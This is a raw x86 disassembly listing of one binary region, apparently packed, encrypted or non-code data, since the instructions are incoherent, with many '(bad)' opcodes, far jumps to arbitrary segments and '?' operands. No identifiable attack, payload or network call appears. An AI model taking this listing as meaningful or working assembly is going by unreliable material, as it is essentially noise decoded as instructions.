  41306a:	ret    0xad36
  41306d:	scas   al,BYTE PTR es:[edi]
  41306e:	aas    
  41306f:	cs (bad) 
  413071:	fstp   st(3)
  413073:	jl     0x41301d
  413075:	stos   BYTE PTR es:[edi],al
  413076:	popa   
  413077:	out    0x3b,al
  413079:	loopne 0x413044
  41307b:	(bad)  
  41307c:	xor    al,0x22
  41307e:	xchg   ecx,eax
  41307f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413080:	test   eax,0xc1bada5a
  413085:	mov    dh,BYTE PTR [esi+edx*1+0x16]
  413089:	cmp    bl,ah
  41308b:	xchg   edi,eax
  41308c:	pop    eax
  41308d:	bound  esi,QWORD PTR [eax+0x114c8523]
  413093:	mov    esi,0x7b761966
  413098:	ja     0x413101
  41309a:	mov    edx,0x27e93ec0
  41309f:	push   ebp
  4130a0:	dec    esp
  4130a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130a2:	cs mov bl,0xab
  4130a5:	and    edi,DWORD PTR [esi-0x45ce1ca7]
  4130ab:	js     0x413121
  4130ad:	repz call esp
  4130b0:	cdq    
  4130b1:	cli    
  4130b2:	lods   eax,DWORD PTR ds:[esi]
  4130b3:	leave  
  4130b4:	sbb    bl,BYTE PTR [ebp+0x15012bc2]
  4130ba:	sahf   
  4130bb:	xchg   ebx,eax
  4130bc:	repnz aam 0x31
  4130bf:	adc    eax,0x2724c910
  4130c4:	fild   WORD PTR [ecx+0x444f1865]
  4130ca:	aam    0xad
  4130cc:	repnz test ecx,0x98d4e9f8
  4130d3:	jns    0x4130e9
  4130d5:	daa    
  4130d6:	xchg   esp,eax
  4130d7:	dec    ebx
  4130d8:	push   eax
  4130d9:	sbb    bl,bh
  4130db:	push   esi
  4130dc:	loope  0x41311f
  4130de:	mov    ecx,0xb039ee43
  4130e3:	arpl   WORD PTR [ecx-0x11],si
  4130e6:	int3   
  4130e7:	xor    dh,al
  4130e9:	fs mov al,0x66
  4130ec:	fucom  st(2)
  4130ee:	dec    ebp
  4130ef:	mov    al,0x8c
  4130f1:	cli    
  4130f2:	bound  esi,QWORD PTR [edi+eax*2-0x3d]
  4130f6:	sbb    al,0x97
  4130f8:	mov    ebp,DWORD PTR [esi]
  4130fa:	adc    BYTE PTR [esi-0x3ee9d7d7],dh
  413100:	test   BYTE PTR [edx+0x7636da8c],ah
  413106:	add    BYTE PTR [edi-0x38],bl
  413109:	ins    DWORD PTR es:[edi],dx
  41310a:	push   0x6c
  41310c:	mov    ebx,0x2c3b8a
  413111:	(bad)  
  413112:	sbb    eax,0xe12010dd
  413117:	lods   eax,DWORD PTR ds:[esi]
  413118:	xor    ch,BYTE PTR [esi-0x3f9dd23a]
  41311e:	loop   0x41319f
  413120:	retf   0xceaa
  413123:	mov    ch,0x3f
  413125:	add    al,0x9f
  413127:	fnstcw WORD PTR [edi+eiz*2+0x2]
  41312b:	loopne 0x413189
  41312d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41312e:	cmp    al,0xb6
  413130:	mov    al,ds:0x49d255ee
  413135:	inc    ebp
  413136:	int3   
  413137:	popa   
  413138:	xchg   ebx,eax
  413139:	jg     0x413155
  41313b:	adc    cl,al
  41313d:	test   eax,0xc6657c98
  413142:	(bad)  
  413143:	pop    edi
  413144:	loop   0x4131b8
  413146:	and    ebx,DWORD PTR [ecx+0x712a292b]
  41314c:	xchg   ebp,eax
  41314d:	mov    ds:0x21afff,al
  413152:	fs jns 0x41316d
  413155:	mov    bh,0x72
  413157:	xchg   BYTE PTR [ebp+0x60],ah
  41315a:	mov    cl,0x98
  41315c:	mov    ch,0xe6
  41315e:	ffreep st(6)
  413160:	sbb    eax,0x49a147e7
  413165:	fdivr  QWORD PTR [edi]
  413167:	pop    eax
  413168:	cs push edx
  41316a:	bound  ebx,QWORD PTR [ecx-0x39]
  41316d:	sti    
  41316e:	or     eax,0x18f02e65
  413173:	push   ds
  413174:	xor    al,0xbb
  413176:	mov    eax,ss
  413178:	mov    cl,BYTE PTR [ebx]
  41317a:	jnp    0x4131a6
  41317c:	ins    BYTE PTR es:[edi],dx
  41317d:	mov    ebp,0x82f79316
  413182:	stos   BYTE PTR es:[edi],al
  413183:	pop    ecx
  413184:	jmp    0xef7e0e96
  413189:	or     ecx,DWORD PTR [ebx+0x7f]
  41318c:	sbb    BYTE PTR [edx],bh
  41318e:	push   ebp
  41318f:	jb     0x4131da
  413191:	ins    BYTE PTR es:[edi],dx
  413192:	and    BYTE PTR [ecx],bh
  413194:	sti    
  413195:	imul   ebx,eax,0x0
  413198:	fldenv [edi-0x50732990]
  41319e:	in     al,dx
  41319f:	pop    esp
  4131a0:	(bad)  
  4131a1:	aad    0x1b
  4131a3:	mov    cl,0x98
  4131a5:	xchg   edi,eax
  4131a6:	mov    esi,0xf66386fa
  4131ab:	in     al,dx
  4131ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ad:	int    0xc9
  4131af:	cwde   
  4131b0:	dec    ebp
  4131b1:	lds    ebx,FWORD PTR [ebp-0x300dc9d1]
  4131b7:	push   0x11c281e8
  4131bc:	repnz das 
  4131be:	test   DWORD PTR [ebx],eax
  4131c0:	repz jnp 0x413218
  4131c3:	pushf  
  4131c4:	cmp    ebx,DWORD PTR [ecx-0x1]
  4131c7:	stos   BYTE PTR es:[edi],al
  4131c8:	add    al,0xd5
  4131ca:	mov    esi,0xcdf8ad93
  4131cf:	sbb    al,0x6a
  4131d1:	add    eax,0x5d5e3c90
  4131d6:	xlat   BYTE PTR ds:[ebx]
  4131d7:	aaa    
  4131d8:	and    BYTE PTR [esi],al
  4131da:	mov    bh,0x67
  4131dc:	shl    BYTE PTR [esi+0xb5eda67],0xd2
  4131e3:	arpl   sp,bx
  4131e5:	out    0xd6,eax
  4131e7:	test   DWORD PTR [edx+ebx*8-0x5636fb99],0xb7a63329
  4131f2:	cdq    
  4131f3:	out    0x8e,eax
  4131f5:	gs call 0x9967:0x8befac53
  4131fd:	leave  
  4131fe:	adc    BYTE PTR [edx-0x78],dl
  413201:	cmp    ebp,edi
  413203:	arpl   WORD PTR [eax],dx
  413205:	inc    ecx
  413206:	in     eax,dx
  413207:	out    0x45,al
  413209:	mov    ds:0x497c7929,eax
  41320e:	repnz lea edi,[edx]
  413211:	lock mov ecx,0x291340f8
  413217:	add    BYTE PTR [ecx],ah
  413219:	jne    0x413249
  41321b:	cmp    al,0xa0
  41321d:	ds pop edx
  41321f:	sub    BYTE PTR ds:0x73cd1c7a,ah
  413225:	js     0x41327c
  413227:	pop    ebp
  413228:	add    al,0xfb
  41322a:	scas   al,BYTE PTR es:[edi]
  41322b:	dec    ebx
  41322c:	jnp    0x413228
  41322e:	mov    dl,0xdd
  413230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413231:	dec    ecx
  413232:	and    BYTE PTR [edx+0x7842f072],dh
  413238:	popa   
  413239:	mov    eax,0xc1b5b178
  41323e:	aam    0x35
  413240:	push   0x3a86bbe5
  413245:	(bad)  
  413246:	int3   
  413247:	pushf  
  413248:	and    BYTE PTR [edx+0x6f05fb8d],al
  41324e:	jb     0x41324f
  413250:	ficom  DWORD PTR [eax+0x1c]
  413253:	pop    ds
  413254:	femms  
  413256:	sahf   
  413257:	jl     0x413216
  413259:	or     al,0x1d
  41325b:	ss jl  0x41326d
  41325e:	mov    ebp,0x86d5fb7a
  413263:	push   cs
  413264:	js     0x4132d0
  413266:	sbb    al,0x82
  413268:	iret   
  413269:	rcl    BYTE PTR [edi+0x41],cl
  41326c:	aas    
  41326d:	js     0x413286
  41326f:	mov    ds:0x25656237,eax
  413274:	sahf   
  413275:	push   eax
  413276:	add    DWORD PTR ds:[eax+edx*1],ebx
  41327a:	mov    esi,esp
  41327c:	mov    WORD PTR [eax-0x43],?
  41327f:	mov    ch,0xe9
  413282:	sub    edx,edx
  413284:	adc    ebp,DWORD PTR [edi-0x1d]
  413287:	fimul  WORD PTR [edx-0x7b717179]
  41328d:	rcr    dh,cl
  41328f:	xchg   DWORD PTR [ebx-0x54],ebx
  413292:	dec    esp
  413293:	mov    edx,0x416ea93b
  413298:	ret    0x1f25
  41329b:	push   esi
  41329c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41329d:	out    dx,eax
  41329e:	repz fild DWORD PTR [ebx]
  4132a1:	and    DWORD PTR ds:0x10302b65,0x91b73442
  4132ab:	stos   BYTE PTR es:[edi],al
  4132ac:	or     ah,BYTE PTR [edx-0x69]
  4132af:	pop    ecx
  4132b0:	pop    ss
  4132b1:	adc    bh,BYTE PTR [edx+0x2d0587a9]
  4132b7:	scas   eax,DWORD PTR es:[edi]
  4132b8:	and    edi,ecx
  4132ba:	add    al,0x14
  4132bc:	pop    ebx
  4132bd:	add    eax,0xa1f0ed3e
  4132c2:	add    eax,0xdacc192a
  4132c7:	cmp    DWORD PTR [eax],edx
  4132c9:	int3   
  4132ca:	xchg   ebx,eax
  4132cb:	jge    0x4132b3
  4132cd:	jne    0x413279
  4132cf:	(bad)  
  4132d1:	(bad)  
  4132d2:	call   0xbd82:0x3dd3972c
  4132d9:	mov    ds:0x2d0b62b,al
  4132de:	outs   dx,BYTE PTR ds:[esi]
  4132df:	mov    ah,0xd5
  4132e1:	sub    eax,0x2d9599cb
  4132e6:	adc    dh,BYTE PTR [edx+0x20]
  4132e9:	dec    esp
  4132ea:	stos   DWORD PTR es:[edi],eax
  4132eb:	retf   0xadf3
  4132ee:	je     0x413285
  4132f0:	jp     0x41330e
  4132f2:	cmp    al,0xf3
  4132f4:	inc    eax
  4132f5:	push   ebx
  4132f6:	mov    BYTE PTR [edx-0x31678aa7],bl
  4132fc:	rol    BYTE PTR [ebp+0x384842ac],cl
  413302:	shl    cl,1
  413304:	add    ebp,DWORD PTR [ebx+0xa16f2f8]
  41330a:	cdq    
  41330b:	or     al,0xa2
  41330d:	(bad)  
  41330e:	pop    edx
  41330f:	iret   
  413310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413311:	lods   eax,DWORD PTR ds:[esi]
  413312:	in     eax,dx
  413313:	in     al,0xf1
  413315:	mov    ds:0x5fc5d2ca,eax
  41331a:	syscall 
  41331c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41331d:	sbb    BYTE PTR [ecx-0x73],bl
  413320:	lods   eax,DWORD PTR ds:[esi]
  413321:	lods   eax,DWORD PTR ds:[esi]
  413322:	mov    eax,0xb8a8c81b
  413327:	dec    DWORD PTR [ebp+0x7b]
  41332a:	or     eax,0x9e0b8289
  41332f:	jge    0xd64cb231
  413335:	jno    0x413338
  413337:	push   ss
  413338:	or     DWORD PTR [edi+ebp*2],esi
  41333b:	icebp  
  41333c:	nop
  41333d:	push   ebx
  41333e:	sbb    eax,0x439b282a
  413343:	xchg   ecx,eax
  413344:	stos   BYTE PTR es:[edi],al
  413345:	and    al,0x12
  413347:	or     DWORD PTR [ebx+ebx*8-0x22],esp
  41334b:	and    BYTE PTR [ebp+0x36],bh
  41334e:	sti    
  41334f:	pop    ecx
  413350:	repz xchg esi,eax
  413352:	(bad)  [ecx-0x5584c524]
  413358:	pop    edi
  413359:	push   esp
  41335a:	shl    BYTE PTR [edx+ebp*4+0x270cd97c],0x1f
  413362:	lods   eax,DWORD PTR ds:[esi]
  413363:	ret    0x2df6
  413366:	jecxz  0x41338d
  413368:	push   cs
  413369:	imul   edx,DWORD PTR [esi-0x3506052a],0xffffff9b
  413370:	jle    0x41334f
  413372:	or     bl,al
  413374:	mov    cs,ebx
  413376:	xor    bh,BYTE PTR [ebp-0x3e]
  413379:	in     al,0xe6
  41337b:	das    
  41337c:	out    dx,eax
  41337d:	inc    edi
  41337e:	outs   dx,DWORD PTR ds:[esi]
  41337f:	mov    DWORD PTR [esi-0x2852b736],esp
  413385:	rcl    DWORD PTR [edx],0xcd
  413388:	aas    
  413389:	and    BYTE PTR [ebx-0x1d],dl
  41338c:	fwait
  41338d:	sahf   
  41338e:	sar    BYTE PTR [esi+0x7656273b],cl
  413394:	dec    ebx
  413395:	pop    es
  413396:	out    dx,eax
  413397:	xchg   DWORD PTR [esi-0x11],ecx
  41339a:	jb     0x41337d
  41339c:	mov    bl,0x80
  41339e:	mov    dh,0xa4
  4133a0:	mov    bl,0x4b
  4133a2:	ss sub al,0x68
  4133a5:	push   ebx
  4133a6:	mov    esp,0x21835835
  4133ab:	loope  0x4133fa
  4133ad:	scas   al,BYTE PTR es:[edi]
  4133ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133af:	adc    al,0xc5
  4133b1:	xchg   ecx,eax
  4133b2:	fdiv   DWORD PTR [edi]
  4133b4:	cli    
  4133b5:	mov    ebp,ebp
  4133b7:	scas   eax,DWORD PTR es:[edi]
  4133b8:	lahf   
  4133b9:	leave  
  4133ba:	stc    
  4133bb:	push   edi
  4133bc:	or     al,BYTE PTR [esi+eiz*4+0x10b77717]
  4133c3:	arpl   cx,di
  4133c5:	hlt    
  4133c6:	clc    
  4133c7:	cmp    ebp,ebx
  4133c9:	mov    ss,WORD PTR [esi-0x32]
  4133cc:	cmp    BYTE PTR ds:0x41a074b1,al
  4133d2:	les    eax,FWORD PTR [ebp-0xb011e7a]
  4133d8:	mov    ch,0x43
  4133da:	out    dx,al
  4133db:	dec    ecx
  4133dc:	dec    esi
  4133dd:	and    bh,BYTE PTR [edx+0x7f4a4956]
  4133e3:	call   0x209c9494
  4133e8:	and    al,0xf5
  4133ea:	aam    0xe
  4133ec:	mov    ebx,0x4c4291d8
  4133f1:	jp     0x413457
  4133f3:	rol    BYTE PTR [eax+0xb],1
  4133f6:	jecxz  0x413470
  4133f8:	into   
  4133f9:	xor    DWORD PTR [edi+0x62],0xaa684126
  413400:	add    BYTE PTR [edx+eiz*1-0x4],dl
  413404:	add    DWORD PTR [ebx-0x4b6aa3f7],ecx
  41340a:	sub    al,0x3b
  41340c:	inc    ebx
  41340d:	xor    ah,0xf2
  413410:	lds    esp,FWORD PTR [ebx-0x450befb4]
  413416:	jmp    0xd2cf:0x84005cb7
  41341d:	sbb    al,0x99
  41341f:	push   esi
  413420:	add    al,0x96
  413422:	fs mov bh,0x7a
  413425:	mov    al,ds:0xee1ccd9f
  41342a:	jp     0x4133cc
  41342c:	lods   eax,DWORD PTR ds:[esi]
  41342d:	in     al,0x30
  41342f:	pop    ecx
  413430:	das    
  413431:	into   
  413432:	lahf   
  413433:	or     BYTE PTR [edx],ah
  413435:	mov    edx,0x54d7a6fa
  41343a:	dec    esi
  41343b:	mov    al,es:0x7e2a131c
  413441:	inc    edx
  413442:	popf   
  413443:	jo     0x4134b6
  413445:	mov    ecx,0xca980ce0
  41344a:	push   esp
  41344b:	mov    al,0x4
  41344d:	sbb    BYTE PTR fs:[ebx-0x80],dh
  413451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413452:	adc    ebx,esi
  413454:	mov    dl,dl
  413456:	cs mov edx,0x2377c724
  41345c:	dec    ebx
  41345d:	jmp    0x413470
  41345f:	jle    0x4134af
  413461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413462:	imul   edx,DWORD PTR [edx+0x70f3cff7],0x54ebf7bb
  41346c:	test   ebx,0x5d483562
  413472:	int    0x36
  413474:	jnp    0x4133f9
  413476:	xchg   DWORD PTR [eax],ebp
  413478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413479:	arpl   WORD PTR [esi+0x41],bp
  41347c:	inc    ebx
  41347d:	or     edx,DWORD PTR [edi-0x441e42b1]
  413483:	mov    dh,0xcb
  413485:	xchg   ebp,eax
  413486:	mov    ds:0x3bd48eba,eax
  41348b:	mov    BYTE PTR [edi+0x539f8e04],bh
  413491:	icebp  
  413492:	adc    eax,0x555d072d
  413497:	hlt    
  413498:	call   0xbd2d:0xfb7be44e
  41349f:	xchg   edx,eax
  4134a0:	cld    
  4134a1:	ins    BYTE PTR es:[edi],dx
  4134a2:	out    0xb1,al
  4134a4:	ret    
  4134a5:	xor    eax,0x15ec911b
  4134aa:	mov    esi,0xe88ac855
  4134af:	inc    edi
  4134b0:	cwde   
  4134b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b2:	mov    ecx,0x2be34ebd
  4134b7:	push   ss
  4134b8:	neg    DWORD PTR [ecx+eiz*8-0x45]
  4134bc:	push   0x8d4e5ac1
  4134c1:	jmp    0x7fa385c6
  4134c6:	in     al,dx
  4134c7:	xor    eax,DWORD PTR ds:0xb92aa4cb
  4134cd:	cmp    cl,BYTE PTR [esi+0x421073fd]
  4134d3:	imul   ebx,DWORD PTR [edx],0x2b
  4134d6:	mov    al,0x8c
  4134d8:	or     cl,BYTE PTR [esi-0x321c62d2]
  4134de:	sti    
  4134df:	mov    bh,0x1f
  4134e1:	fs jl  0x41353f
  4134e4:	jp     0x41350c
  4134e6:	cmc    
  4134e7:	cmp    DWORD PTR [edi],esp
  4134e9:	mov    ds:0x4e526b52,eax
  4134ee:	lahf   
  4134ef:	push   0xffffffc5
  4134f1:	cs cdq 
  4134f3:	bound  esp,QWORD PTR [esp+eiz*4+0xbfec05e]
  4134fa:	mov    bh,0x21
  4134fc:	mov    dl,dh
  4134fe:	jle    0x4134d0
  413500:	cmp    bl,BYTE PTR [edx+0x1e71b827]
  413506:	dec    ebp
  413507:	inc    edi
  413508:	xlat   BYTE PTR ds:[ebx]
  413509:	daa    
  41350a:	push   ss
  41350b:	xchg   ecx,eax
  41350c:	jae    0x4134d0
  41350e:	icebp  
  41350f:	mov    edi,0xaaad63de
  413514:	jae    0x4134bf
  413516:	nop
  413517:	jno    0x4134f7
  413519:	sbb    al,0xfd
  41351b:	jmp    0x246c:0x19d3df74
  413522:	pop    edx
  413523:	dec    esp
  413524:	push   cs
  413525:	outs   dx,BYTE PTR ds:[esi]
  413526:	sbb    DWORD PTR [edi],0xde6ca19b
  41352c:	shr    BYTE PTR [eax+0x11fba104],cl
  413532:	test   BYTE PTR [ebx-0x7e7c2f66],ah
  413538:	call   0xe841:0x55e3d332
  41353f:	les    ebx,FWORD PTR [ecx+0x7d]
  413542:	and    dl,BYTE PTR [ebx+esi*4]
  413545:	jb     0x413572
  413547:	dec    ebp
  413548:	cmp    eax,0x93ad9b89
  41354d:	mov    al,BYTE PTR [edx-0x3b]
  413550:	push   edi
  413551:	lods   eax,DWORD PTR ds:[esi]
  413552:	mov    ds:0x137303c9,eax
  413557:	xor    eax,0x1aa734
  41355c:	mov    ecx,0x5cce36f2
  413561:	push   esp
  413562:	xchg   ebx,eax
  413563:	icebp  
  413564:	aam    0xe0
  413566:	push   edx
  413567:	scas   al,BYTE PTR es:[edi]
  413568:	cmp    eax,0xaa77226d
  41356d:	push   cs
  41356e:	mov    DWORD PTR [esi+0x1bb70e48],0x9ded7c5e
  413578:	fidiv  WORD PTR [eax+0x6a]
  41357b:	out    0x99,al
  41357d:	dec    esi
  41357e:	adc    al,cl
  413580:	xor    al,0x58
  413582:	push   eax
  413583:	pop    es
  413584:	inc    ebp
  413585:	pop    ebp
  413586:	sahf   
  413587:	cli    
  413588:	push   ss
  413589:	retf   0xb5b8
  41358c:	stos   DWORD PTR es:[edi],eax
  41358d:	mov    ebx,0xfb77e75
  413592:	retf   
  413593:	add    ebx,edx
  413595:	inc    ebx
  413596:	scas   al,BYTE PTR es:[edi]
  413597:	push   edi
  413598:	enter  0xd306,0x99
  41359c:	inc    eax
  41359d:	btc    DWORD PTR [ecx-0x3a],esp
  4135a1:	push   eax
  4135a2:	int    0x7e
  4135a4:	sbb    eax,0xdac4cce2
  4135a9:	loopne 0x4135be
  4135ab:	push   edi
  4135ac:	fiadd  WORD PTR [eax]
  4135ae:	xor    edx,esp
  4135b0:	std    
  4135b1:	mov    ds:0x15a58bcc,eax
  4135b6:	out    0xe5,al
  4135b8:	test   DWORD PTR [ebp-0x27],esp
  4135bb:	neg    BYTE PTR [ecx]
  4135bd:	sahf   
  4135be:	mov    DWORD PTR [ecx+0x36ab2cc8],ebp
  4135c4:	jmp    0x4888:0x164a710a
  4135cb:	std    
  4135cc:	mov    bh,0xe0
  4135ce:	stos   BYTE PTR es:[edi],al
  4135cf:	mov    ebp,0xecbec043
  4135d4:	outs   dx,DWORD PTR ds:[esi]
  4135d5:	int3   
  4135d6:	(bad)  
  4135d7:	mov    ah,0x60
  4135d9:	ficom  DWORD PTR [eax+eiz*2-0x2d]
  4135dd:	pop    ebx
  4135de:	scas   eax,DWORD PTR es:[edi]
  4135df:	test   eax,0xcae2dbd8
  4135e4:	ds (bad) 
  4135e6:	arpl   WORD PTR [edi+0x3b688401],di
  4135ec:	fimul  WORD PTR [eax-0x64]
  4135ef:	sahf   
  4135f0:	adc    esi,DWORD PTR ds:0x7e6f4d81
  4135f6:	and    BYTE PTR [edi],al
  4135f8:	sti    
  4135f9:	fild   QWORD PTR [esi+0x695da3c2]
  4135ff:	xor    dl,0x5b
  413602:	int    0xdb
  413604:	inc    ebp
  413605:	pop    ds
  413606:	lods   eax,DWORD PTR ds:[esi]
  413607:	push   cs
  413608:	test   BYTE PTR [edx+0x58],ch
  41360b:	mov    esi,0x60047d70
  413610:	sbb    eax,0xb227f448
  413615:	aas    
  413616:	and    BYTE PTR [esi],bh
  413618:	adc    ah,bl
  41361a:	mov    eax,ds:0xfe4156c3
  41361f:	es mov ecx,0xb0397a24
  413625:	jmp    0x9c00:0x8df4982b
  41362c:	call   0x8865:0x81ae0410
  413633:	mov    bh,0x37
  413635:	push   0xffffffa1
  413637:	rcr    DWORD PTR [ecx-0x8071031],0x2c
  41363e:	inc    eax
  41363f:	mov    ?,WORD PTR gs:[eax+0x3a6e6a52]
  413646:	loop   0x41362c
  413648:	cmp    eax,0x8d0b0b21
  41364d:	sti    
  41364e:	scas   eax,DWORD PTR es:[edi]
  41364f:	push   edx
  413650:	std    
  413651:	jmp    0x6b70:0xf5cb0046
  413658:	das    
  413659:	xchg   edi,eax
  41365a:	sub    DWORD PTR [edx+0x4f],ebp
  41365d:	sub    ebx,DWORD PTR [ecx-0x3e]
  413660:	cmp    al,0x32
  413662:	popa   
  413663:	shr    DWORD PTR [ebx],1
  413665:	mov    esi,0xdee2bb0
  41366a:	rol    DWORD PTR [edx+0xb],cl
  41366d:	inc    ebp
  41366e:	aad    0x9f
  413670:	or     al,0xf5
  413672:	cmp    al,0x18
  413674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413675:	mov    BYTE PTR [esi-0x5c],cl
  413678:	test   BYTE PTR [ebp-0x391d36df],ch
  41367e:	fs mov edx,0x4007f970
  413684:	ja     0x4136a5
  413686:	test   eax,0xa1134e8
  41368b:	arpl   WORD PTR fs:[ebx],si
  41368e:	mov    esi,fs
  413690:	and    eax,0x69c03dc
  413695:	das    
  413696:	mov    dh,0x64
  413698:	pop    ss
  413699:	and    eax,0x982c68f4
  41369e:	cmp    esp,DWORD PTR [ebx+0x419a40be]
  4136a4:	scas   al,BYTE PTR es:[edi]
  4136a5:	aad    0xa7
  4136a7:	push   edi
  4136a8:	jle    0x413720
  4136aa:	popa   
  4136ab:	icebp  
  4136ac:	sub    esi,0xffffff89
  4136af:	popf   
  4136b0:	mov    esp,0x730404f9
  4136b5:	mov    eax,ds:0xf2d52474
  4136ba:	add    esi,DWORD PTR [ebp-0x1be405fa]
  4136c0:	xor    bh,bh
  4136c2:	add    DWORD PTR [esi-0x343063f4],eax
  4136c8:	inc    edi
  4136c9:	xor    esp,DWORD PTR [ecx+0x7c1d3dbe]
  4136cf:	push   ebx
  4136d0:	mov    cl,0xda
  4136d2:	fld    QWORD PTR [ecx+eiz*8-0x40f58524]
  4136d9:	(bad)  
  4136da:	mov    ds:0x4a0c4004,eax
  4136df:	(bad)  
  4136e0:	push   edx
  4136e1:	(bad)  
  4136e2:	test   DWORD PTR [ebx+0x217795ef],0x5deee11d
  4136ec:	dec    eax
  4136ed:	sub    bh,BYTE PTR [ebp-0x2ccb9656]
  4136f3:	xor    al,0xd8
  4136f5:	dec    ebp
  4136f6:	(bad)  
  4136f7:	dec    ebx
  4136f8:	sbb    BYTE PTR [ebx+0x22],ah
  4136fb:	push   edi
  4136fc:	cmp    WORD PTR [edx+0x2a],bx
  413700:	xor    BYTE PTR [esi],al
  413702:	test   ecx,0xbd3040fd
  413708:	push   0x8822cdf2
  41370d:	in     al,dx
  41370e:	fs out 0x4f,al
  413711:	lods   al,BYTE PTR ds:[esi]
  413712:	mov    ?,edi
  413714:	pop    ss
  413715:	pop    ds
  413716:	jmp    0xf288:0x2bbab2d8
  41371d:	or     eax,0xf016f666
  413722:	es mov ch,0x2d
  413725:	push   ss
  413726:	mov    al,0xeb
  413728:	and    edi,DWORD PTR [eax+0x441fc3a1]
  41372e:	xchg   edx,eax
  41372f:	wbinvd 
  413731:	int3   
  413732:	mov    eax,0x6ab5e520
  413737:	pop    ecx
  413738:	xor    BYTE PTR [ebx-0x4da0549f],al
  41373e:	sar    ch,0x2
  413741:	loope  0x4136d9
  413743:	fnsave [edx]
  413745:	or     al,dl
  413747:	xor    ah,BYTE PTR [esi-0x3]
  41374a:	mov    al,0x3f
  41374c:	adc    edx,DWORD PTR [edi+0x35]
  41374f:	adc    al,0xd5
  413751:	scas   al,BYTE PTR es:[edi]
  413752:	dec    edx
  413753:	rcr    DWORD PTR [ecx],cl
  413755:	mov    eax,ds:0x22c6dc63
  41375a:	pop    ss
  41375b:	sbb    al,BYTE PTR [edi-0x164510a]
  413761:	bound  ecx,QWORD PTR [ebx]
  413763:	or     BYTE PTR [ebx+0x7d],bh
  413766:	inc    eax
  413767:	sub    BYTE PTR [edi-0x36],bh
  41376a:	jae    0x413790
  41376c:	mov    al,0x63
  41376e:	mov    cl,0x24
  413770:	sti    
  413771:	out    dx,al
  413772:	ror    DWORD PTR [eax-0x66e1232d],cl
  413778:	cmp    al,0x52
  41377a:	sbb    edi,DWORD PTR [esi-0x6f9fcd5c]
  413780:	mov    eax,0xf1fc6c1
  413785:	jg     0x41375d
  413787:	pop    eax
  413788:	mov    ecx,0xc44fdcba
  41378d:	mov    dl,0xd0
  41378f:	mov    edi,0x3c6fe66c
  413794:	pop    edx
  413795:	fistp  QWORD PTR [ebx+0x22]
  413798:	dec    eax
  413799:	add    eax,0x8f3e7b17
  41379e:	mov    ch,0x95
  4137a0:	call   0xbb10:0xe508cd1b
  4137a7:	pushf  
  4137a8:	mov    dh,0xaa
  4137aa:	mov    ch,BYTE PTR [ebp-0x1c]
  4137ad:	stc    
  4137ae:	iret   
  4137af:	jae    0x413800
  4137b1:	jmp    0x4137d8
  4137b3:	adc    dl,BYTE PTR [esp+ebp*4-0x19]
  4137b7:	ss gs ja 0x4137d7
  4137bb:	mov    esi,0x888c38c
  4137c0:	in     eax,dx
  4137c1:	out    dx,eax
  4137c2:	daa    
  4137c3:	fsubr  DWORD PTR [eax]
  4137c5:	mov    al,ds:0x793cbfe7
  4137ca:	jno    0x413845
  4137cc:	inc    ecx
  4137cd:	pop    es
  4137ce:	jnp    0x4137d2
  4137d0:	loop   0x41377b
  4137d2:	aad    0xf6
  4137d4:	push   ss
  4137d5:	mov    es,WORD PTR [edi+0x6767f14]
  4137db:	inc    ebp
  4137dc:	push   es
  4137dd:	imul   esp,ecx,0xbf51b6f2
  4137e3:	sar    DWORD PTR [ecx],cl
  4137e5:	test   DWORD PTR [edi-0x3a],ecx
  4137e8:	pop    es
  4137e9:	and    edx,DWORD PTR [ebp-0x1e18fe23]
  4137ef:	rol    BYTE PTR [eax+0x4],1
  4137f2:	push   es
  4137f3:	push   eax
  4137f4:	or     bl,0x22
  4137f7:	xchg   ebx,eax
  4137f8:	push   0xec0b5040
  4137fd:	xor    esi,DWORD PTR [edi]
  4137ff:	mov    ds:0xe988cbab,al
  413804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413805:	inc    ecx
  413806:	jae    0x413822
  413808:	das    
  413809:	mov    esp,0x3e7c3837
  41380e:	mov    dl,0x69
  413810:	bound  ebx,QWORD PTR [esi]
  413812:	cmp    BYTE PTR [esi+edi*2],dh
  413815:	iret   
  413816:	cmp    al,BYTE PTR [esi-0x53]
  413819:	mov    dl,0xb8
  41381b:	mov    ecx,DWORD PTR [esi+ecx*8]
  41381e:	ficom  DWORD PTR [edi]
  413820:	and    bh,al
  413822:	cmp    esi,DWORD PTR [edi]
  413824:	xor    ah,BYTE PTR [ecx-0x7f]
  413827:	push   cs
  413828:	sbb    DWORD PTR [ebx],edx
  41382a:	push   cs
  41382b:	cmp    eax,0xb681fa2a
  413830:	aam    0x80
  413832:	adc    eax,0x56b7b15b
  413837:	adc    ecx,DWORD PTR [ebx+esi*4-0x763477d4]
  41383e:	mov    cl,0x62
  413840:	jecxz  0x413886
  413842:	rcr    BYTE PTR [eax],0x4d
  413845:	pop    edi
  413846:	arpl   WORD PTR [ebp+0x37],bx
  413849:	jp     0x413809
  41384b:	dec    eax
  41384c:	into   
  41384d:	sbb    al,0x75
  41384f:	outs   dx,DWORD PTR ds:[esi]
  413850:	(bad)  
  413851:	dec    ebx
  413852:	push   0xffffffbc
  413854:	in     al,0x3b
  413856:	jno    0x4138bf
  413858:	int3   
  413859:	xchg   ebp,eax
  41385a:	shl    edi,1
  41385c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41385d:	hlt    
  41385e:	mov    edx,0xf5408b3b
  413863:	mov    dh,0x7
  413865:	push   esp
  413866:	fdiv   QWORD PTR [ecx]
  413868:	gs dec esi
  41386a:	aas    
  41386b:	cmp    ah,0x42
  41386e:	push   esi
  41386f:	retf   0xadde
  413872:	xor    eax,0x54b6bb9b
  413877:	lods   eax,DWORD PTR ds:[esi]
